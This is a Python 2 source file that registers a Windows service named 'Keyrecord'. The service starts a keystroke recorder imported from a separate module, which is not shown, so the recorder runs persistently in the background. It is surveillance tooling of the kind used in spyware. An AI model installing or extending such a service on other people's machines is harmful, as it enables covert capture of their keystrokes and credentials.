#!/usr/bin/env python
#coding: utf-8

import win32serviceutil
import win32service
import win32event
import winerror
import servicemanager
import os
import sys

class ServiceLauncher(win32serviceutil.ServiceFramework):
    _svc_name_ = 'Keyrecord'
    _svc_display_name_ = 'Keyrecord'
    _svc_description_ = "Keyrecord for windows"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.run = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        import KeyRecorder_Win
        kr = KeyRecorder_Win.Keyrecorder()
        kr.record()

if __name__=='__main__':
    if len(sys.argv) == 1:
        try:
            evtsrc_dll = os.path.abspath(servicemanager.__file__)
            servicemanager.PrepareToHostSingle(ServiceLauncher)
            servicemanager.Initialize('ServiceLauncher', evtsrc_dll)
            servicemanager.StartServiceCtrlDispatcher()
        except win32service.error, details:
            if details[0] == winerror.ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
                win32serviceutil.usage()
            else:
                win32serviceutil.HandleCommandLine(ServiceLauncher)
